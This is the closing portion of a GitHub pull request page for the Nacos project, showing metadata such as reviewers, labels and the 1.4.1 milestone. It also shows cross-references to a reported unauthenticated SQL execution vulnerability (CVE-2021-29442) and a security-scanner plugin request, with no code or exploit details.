 [![@haoyann](https://avatars.githubusercontent.com/u/43994656?s=40&u=d6e57f5277433e8d73fcb759cca59ec456bce8b4&v=4)](/haoyann)
[haoyann](/haoyann)
deleted the
fix-4463

branch
[January 13, 2021 11:12](#event-4200681766)

[![@threedr3am](https://avatars.githubusercontent.com/u/19884279?s=40&v=4)](/threedr3am)
[threedr3am](/threedr3am)
mentioned this pull request
[Oct 5, 2021](#ref-issue-1015522443)

[PRP: Request Alibaba-Nacos CVE-2021-29442 execute arbitrary SQL without authentication
google/tsunami-security-scanner-plugins#121](/google/tsunami-security-scanner-plugins/issues/121)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Fpull%2F4517)

Reviewers

[![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=40&v=4)](/KomachiSion) [KomachiSion](/KomachiSion)

KomachiSion approved these changes

Assignees

No one assigned

Labels

[area/Config](/alibaba/nacos/labels/area/Config)
[kind/enhancement](/alibaba/nacos/labels/kind/enhancement)
Category issues or prs related to enhancement.

Projects

None yet

Milestone

 [**1.4.1**](/alibaba/nacos/milestone/23 "1.4.1")

Development

Successfully merging this pull request may close these issues.

 [Report a security vulnerability in nacos to execute arbitrary SQL without authentication](https://github.com/alibaba/nacos/issues/4463)

2 participants

[![@haoyann](https://avatars.githubusercontent.com/u/43994656?s=52&v=4)](/haoyann) [![@KomachiSion](https://avatars.githubusercontent.com/u/37170243?s=52&v=4)](/KomachiSion)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


